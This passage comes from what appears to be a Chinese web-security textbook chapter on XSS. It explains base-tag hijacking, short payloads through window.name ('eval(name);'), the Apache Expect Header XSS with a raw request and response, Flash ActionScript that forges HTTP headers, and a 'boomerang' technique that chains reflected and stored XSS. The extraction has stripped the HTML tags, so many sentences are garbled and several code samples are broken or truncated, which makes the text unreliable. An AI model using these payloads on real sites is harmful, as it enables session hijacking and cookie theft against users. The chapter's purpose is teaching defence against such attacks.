http://www.google.com/intl/en_AL../Images/
srpr/logo1w.png
在标签前加入一个标签：
标签将指定其后的标签默认从“http://www.google.com”取URL：
测试页面
图片被找到了。
需要特别注意的是，在有的技术文档中，提到标签只能用于标签之
内，其实这是不对的。标签可以出现在页面的任何地方，并作用于位于该标签
之后的所有标签。
攻击者如果在页面中插入了标签，就可以通过在远程服务器上伪造图片、
链接或脚本，劫持当前页面中的所有使用“相对路径”的标签。比如：
….
….
…
auth
所以在设计XSS安全方案时，一定要过滤掉这个非常危险的标签。
3.2.6.4 window.name的妙用
window.name对象是一个很神奇的东西。对当前窗口的window.name对象赋值，没
有特殊字符的限制。因为window对象是浏览器的窗体，而并非document对象，因此很
多时候window对象不受同源策略的限制。攻击者利用这个对象，可以实现跨域、跨页
面传递数据。在某些环境下，这种特性将变得非常有用。
参考以下案例。假设“www.a.com/test.html”的代码为：
这段代码将window.name赋值为test，然后显示当前域和window.name的值，最后
将页面跳转到“www.b.com/test1.html”。“www.b.com/test1.html”的代码为：
alert(document.domain+" "+window.name);
这里显示了当前域和window.name的值。最终效果如下，访
问“www.a.com/test.html”：
测试页面
window.name赋值成功，然后页面自动跳转到“www.b.com/test1.html”：
测试页面
这个过程实现数据的跨域传递：“test”这个值从www.a.com传递到www.b.com。
使用window.name可以缩短XSS Payload的长度，如下所示：
在同一窗口打开XSS的站点后，只需通过XSS执行以下代码即可：
eval(name);
只有11个字节，短到了极点。
这个技巧为安全研究者luoluo所发现，同时他还整理了很多绕过XSS长度限制的技
巧。
3.2.7 变废为宝：Mission Impossible
从XSS漏洞利用的角度来看，存储型XSS对攻击者的用处比反射型XSS要大。因为
存储型XSS在用户访问正常URL时会自动触发；而反射型XSS会修改一个正常的URL，
一般要求攻击者将XSSURL发送给用户点击，无形中提高了攻击的门槛。
而有的XSS漏洞，则被认为只能够攻击自己，属于“鸡肋”漏洞。但随着时间的推
移，数个曾经被认为是无法利用的XSS漏洞，都被人找到了利用方法。
3.2.7.1 Apache Expect Header XSS
“Apache Expect Header XSS”漏洞最早公布于2006年。这个漏洞曾一度被认为是
无法利用的，所以厂商不认为这是个漏洞。这个漏洞的影响范围是：Apache Httpd
Server版本1.3.34、2.0.57、2.2.1及以下。漏洞利用过程如下。
向服务器提交：
GET / HTTP/1.1
Accept: */*
Accept-Language: en-gb
Content-Type: application/x-www-form-
urlencoded
Expect:
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE
6.0; Windows NT 5.1; SV1; .NET CLR
2.0.50727; .NET
CLR 1.1.4322)
Host: www.whiteacid.org
Connection: Keep-Alive
服务器返回：
HTTP/1.1 417 Expectation Failed
Date: Thu, 21 Sep 2006 20:44:52 GMT
Server: Apache/1.3.33 (Unix)
mod_throttle/3.1.2 DAV/1.0.3
mod_fastcgi/2.4.2
mod_gzip/1.3.26.1a PHP/4.4.2 mod_ssl/2.8.22
OpenSSL/0.9.7e
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html; charset=iso-8859-1
1ba
417 Expectation Failed
Expectation Failed
The expectation given in the Expect request-
header
field could not be met by this server.
The client sent
Expect:
but we only allow the 100-continue
expectation.
0
注意到服务器在出错返回时，会把Expect头的内容未经任何处理便写入到页面中，
因此Expect头中的HTML代码就被浏览器解析执行了。
这是Apache的漏洞，影响范围相当广。从这个攻击过程可以看出，需要在提交请
求时向HTTP头中注入恶意数据，才能触发这个漏洞。但对于XSS攻击来说，JavaScript
工作在渲染后的浏览器环境中，无法控制用户浏览器发出的HTTP头。因此，这个漏洞
曾经一度被认为是“鸡肋”漏洞。
后来安全研究者Amit Klein提出了“使用Flash构造请求”的方法，成功地利用了这个
漏洞，变废为宝！
在Flash中发送HTTP请求时，可以自定义大多数的HTTP头。如下是Amit Klein的演
示代码：
//Credits to Amit Klein as he wrote this, I
just decompiled it
inURL = this._url;
inPOS = inURL.lastIndexOf("?");
inParam = inURL.substring(inPOS + 1,
inPOS.length);
req = new LoadVars();
req.addRequestHeader("Expect",
"");
");
req.send(inParam, "_blank", "POST");
正因为此，Flash在新版本中禁止用户自定义发送Expect头。但后来发现可以通过
注入HTTP头的方式绕过这个限制：
req.addRequestHeader("Expect:FooBar","");
目前Flash已经修补好了这些问题。
此类攻击，还可以通过Java Applet等构造HTTP请求的第三方插件来实现。
3.2.7.2 Anehta的回旋镖
反射型XSS也有可能像存储型XSS一样利用：将要利用的反射型XSS嵌入一个存储
型XSS中。这个攻击技巧，曾经在笔者实现的一个XSS攻击平台（Anehta）中使用过，
笔者将其命名为“回旋镖”。
因为浏览器同源策略的原因，XSS也受到同源策略的限制——发生在A域上的XSS
很难影响到B域的用户。
回旋镖的思路就是：如果在B域上存在一个反射型“XSS_B”，在A域上存在一个存储
型“XSS_A”，当用户访问A域上的“XSS_A”时，同时嵌入B域上的“XSS_B”，则可以达到
在A域的XSS攻击B域用户的目的。
我们知道，在IE中，、、等标签都会拦截“第三方Cookie”的发
送，而在Firefox中则无这种限制（第三方Cookie即指保存在本地的Cookie，也就是服务
器设置了expire时间的Cookie）。
所以，对于Firefox来说，要实现回旋镖的效果非常简单，只需要在XSS_A处嵌入一
个iframe即可：
但是对于IE来说，则要麻烦很多。为了达到执行XSS_B的目的，可以使用一个
标签，在浏览器提交form表单时，并不会拦截第三方Cookie的发送。
因此，先在XSS_A上写入一个，自动提交到XSS_B，然后在XSS_B中再跳
转回原来的XSS_A，即完成一个“回旋镖”的过程。但是这种攻击的缺点是，尽管跳转花
费的时间很短，但用户还是会看到浏览器地址栏的变化。
代码如下：
var target = "http://www.b.com/
xssDemo.html#'>
ActionScript是一种非常强大和灵活的脚本，甚至可以使用它发起网络连接，因此
应该尽可能地禁止用户能够上传或加载自定义的Flash文件。